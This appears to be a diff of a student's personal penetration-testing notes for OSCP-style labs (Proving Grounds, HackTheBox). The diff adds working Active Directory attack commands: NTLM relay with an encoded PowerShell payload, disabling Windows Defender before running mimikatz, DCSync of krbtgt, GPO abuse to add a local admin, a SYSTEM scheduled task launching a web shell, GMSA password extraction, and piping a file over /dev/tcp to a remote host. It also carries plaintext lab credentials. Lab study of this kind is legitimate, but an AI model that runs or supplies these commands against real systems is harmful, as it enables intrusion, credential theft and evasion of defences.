@@ -1,6 +1,24 @@
 *************************[port maps]*************************
 
+(ospg:zeus) 
+command to filter users of rid brute
+cat users| cut -d '\' -f 2 | grep -i SidTypeUser | cut -d '(' -f 1 | sed 's/ //g' > usrs
+----------------------------------
+(ospg:laser)
+command to put the ntlm_theft
+smbclient -U 'laser.com/Eric.Wallows%EricLikesRunning800' //192.168.129.173/Apps -c 'prompt OFF; recurse ON; lcd /path/to/local/cake; cd /remote/path/on/Apps; mput *'
 
+interesting goby obfuscating powershell
+https://medium.com/@ankitsinha81195_47457/payload-obfuscation-444857de70e7
+https://iritt.medium.com/an-easy-guide-to-obfuscating-powershell-scripts-with-invoke-obfuscation-6fa3c8626ed3
+------------------------------
+(ospg:nagoya)
+lastly i solved the mssql kerberos auth issue using this walkthrough
+https://medium.com/@desp0/tj-nulls-oscp-pick-nagoya-lab-walkthrough-offsec-proving-grounds-guide-b15412c92987
+
+the issue - i forward the port to ligolo then in the /etc/hosts
+240.0.0.1 nagoya.nagoya-industries.com nagoya
+--------------------------------------------------
 [*] ntlm relay attack - execute command without knowing the password
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 
@@ -11,8 +29,6 @@ In this example we don't use the local Administrator user for the relay attack a
 UAC remote restrictions limit the users we can use in pass-the-hash or relay attacks outside of an Active Directory environment.
 
 We already encountered UAC remote restrictions for non-domain joined machines in the Password Attacks Module. However, this kind of restriction does not apply to domain users, meaning that we can leverage full privileges while moving laterally with the techniques shown in this Learning Unit. (in wmi winrm - lateral movement module)
-
-[*] Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain.
 -----------------------------------------
 i found two ways to exploit redis
 (ospg:sybris)
@@ -132,6 +148,8 @@ sudo ip link set ligolo up
 sudo ip route add 240.0.0.1/32 dev ligolo
 sudo ip route add 10.10.139.0/24 dev ligolo
 
+sudo ip route add 240.0.0.1/32 dev pum
+
 
 delete 
 sudo ip link set ligolo down
@@ -142,6 +160,8 @@ sudo ip route del 10.10.139.0/24 dev ligolo
 MATCH (n)
 DETACH DELETE n;
 
+MATCH (u:User)
+RETURN u;
 ---------------------------------------------------------------------
 (ospg:cockpit)a very shocking way how he reached the sql injection
 https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt 
@@ -422,6 +442,54 @@ cat users.txt | awk -F\\[ '{print $2}' | awk -F\\] '{print $1}' > final_user.txt
 [there are things you can do in this workstaions with this user that you can not do on the other workstations which will get you a domaion user]
 
 
+---------------------------------------------------------------
+(ospg:vault)  checking if our user has access to modify any Group Policy Objects.
+Get-NetGPO
+Get-GPPermission -Guid [of the gpo] -TargetType User -TargetName [your-user]
+wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
+./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+---------------------------------------------------------------------
+(ospg:vault) We cannot access the scheduled tasks but we still might be able to manipulate one. Let’s look at them. We want a task that is run by SYSTEM dir c:\windows\system32\tasks
+
+abuse serestoreprivilege even if there is no RDP
+https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------
+------------------------------------------------------------------------------------
+(htb:puppy) very nice articles helped me alot  to first add a user to another group 
+secondly to remove the ACCOUNTDISABLE
+https://medium.com/@hush0x01/vintage-hackthebox-walkthrough-e12096699c63
+
+- it is my first time to see this factor of impacket-dpapi
+My thought was that it's possible the user performed some administrative tasks as C.Neri_adm while logged in as C.Neri and would therefore have some cached credentials on the box.
+[*] dpapi - give you important credentials to escalate
+
+method of transferring files 
+[Convert]::ToBase64String([IO.File]::ReadAllBytes('c:\Ubuntu.zip'))
+--------------------------------------
+(ospg:laser) sometimes there could be a user that is not grapped with rid like what happened with o.foller when it give me headache to get into ms02 // Relying only on nxc can make you miss disabled users. Therefore, always use bloodhound also to enumerate all users.
+
+to avoid this issue 
+execute neo4j users command and count the rid users it must match in number
+----------------------------------------------------------
+(ospg:posedeion) 
+interesting go by 
+when you are admin turn off the anti virus to start mimikatz.exe
+Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true; Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Users\Administrator\Desktop"
+
+and when you are a local admin at a DC you can always perform DCSYNC ATTACK
+.\mimikatz.exe 'lsadump::dcsync /user:CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb' exit
+
+also precompiled rubeus
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
+
+0xdf to get the domain sid of another trusted domain with neo4j
+MATCH P = (:Domain) - [:TrustedBy]->(:Domain)
+RETURN P
+LIMIT 1000
+
+--------------------------------------------------
+if you have sebackuprivilege use this dork 
+site:medium.com " .dsh" tryhackme
+-------------------------------------------------------------
 (ospg:nagoya)
 find a way to execute stuff inside the machine as a pre-authenticated user so that we you are stuck from outside __like you exploited and inside the machine but does not have the user pass__
 __we performed these attack without access to the plaintext password or password hash of this user.__
@@ -433,7 +501,7 @@ perform asreproast
 perform kerberoast
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 
-perform sliver ticket 
+perform silver ticket 
 privilege::debug
 sekurlsa::logonpasswords // ntlm hash of the servicePrincipalName This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
 whoami /user // to get sid and rid for domain and user
@@ -513,8 +581,28 @@ PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCreden
 PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
 PS C:\Users\jeff> Enter-PSSession 1
 
+perform impersonated command execution // from Hutch box for priv escalation 
+$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
+
+perform to see what groups this account belongs to (ospg:heist)
+Get-ADPrincipalGroupMembership enox | select name
+
+perform a see what users or groups have permissions to retrieve GMSA (ospg:heist)) //GMSA is a higher security option for non-interactive applications hese service accounts are given automatically-generated passwords 
+Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword
+
+perform indeed retrieve the password GMSA hash
+Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+$gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+$mp
+
 To get the SPN
 Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+Get-ADUser -Filter {ServicePrincipalNames -like "*"} -Properties ServicePrincipalNames | Select-Object Name, SamAccountName, ServicePrincipalNames
+
 -----------------------------------------------------------
 (ospg:marketing) 
 cat file.txt > /dev/tcp/10.10.10.189/9001
@@ -749,12 +837,15 @@ https://medium.com/@hughbrown123/walk-through-hints-querier-htb-0726d5b18961
 
 
 *************************[group specifics]*************************
+[things that you can because you belong to a group do that others can not do]
 
 
-
+(ospg:heist) check if your group or user allow you to read the GMSA of a service
+-----------------------------------------------------------
 [*] service - can be used for addition path vector user access to the machine
-    - use the service itself as part of the process
+    - use the service itself as part of the process like ldap or to exploit it like web
     - Silver Ticket Attacks
+    - retrieve its GMSA (workstation specifics, groups specifics) (ospg:heist)
 -------------------------------------------
 (ospg:) 
 [*] genericall - allows you to impersonate admin or any user in the domain
@@ -840,6 +931,7 @@ ALL 180
 
 CVES and the scripts that exploit you must understand becasue it is the things that makes you better connecting the ports without the need for scripts
 
+[*] XSRF - enables you to reset password of admin by form that acts like csrf to do action you can know it after a form that get request to you
 
 
 --------------------------
